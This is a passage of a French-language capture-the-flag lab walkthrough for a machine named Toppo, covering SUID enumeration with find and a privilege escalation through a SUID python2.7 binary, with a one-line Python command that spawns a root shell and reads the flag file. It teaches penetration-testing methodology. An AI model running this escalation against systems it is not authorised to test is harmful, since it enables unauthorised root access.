5

Énumération locale — SUID

Après un premier accès, on cherche les moyens de passer root.

ted@Toppo: ~
ted@Toppo:~$ find / -perm -4000 -type f 2>/dev/null
/sbin/mount.nfs
/usr/bin/python2.7
anomalie/usr/bin/python2.7 est SUID root → aucune Debian standard ne fait ça. sudo -lsudo n'est même pas installé sur cette machine → la voie classique est fermée, il faut chercher ailleurs.
6

Élévation — python2.7 SUID → root

Un interpréteur SUID root donne un shell root immédiat.

ted@Toppo: ~
ted@Toppo:~$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@Toppo:~# cat /root/flag.txt
Congratulations ! there is your flag : 0wnedlab{••••••••••••••••}
os.setuid(0)force l'UID effectif à root (le SUID du binaire le permet déjà). flagà récupérer toi-même dans le terminal, puis à valider avec le champ flag en bas.

Ce qu'il faut vraiment comprendre

On énumère avant d'exploiter

Chaque étape produit une info qui guide la suivante. nmap donne les ports → gobuster donne les répertoires → notes.txt donne les creds → SSH donne un shell → find donne le SUID → le SUID donne root.

Les permissions Unix ne sont pas décoratives

Avant l'élévation, cat /root/flag.txt renvoie un vrai Permission non accordée : ted n'a ni les droits owner ni les droits "other" sur ce fichier. C'est exactement ce refus qui justifie tout le chapitre privesc — pas une convention du jeu.

Un SUID anormal, c'est une porte ouverte

Sur Debian, python2.7 n'est jamais SUID root. Dès qu'un binaire interpréteur (python, perl, vim, less…) est SUID, il donne un shell root immédiat.
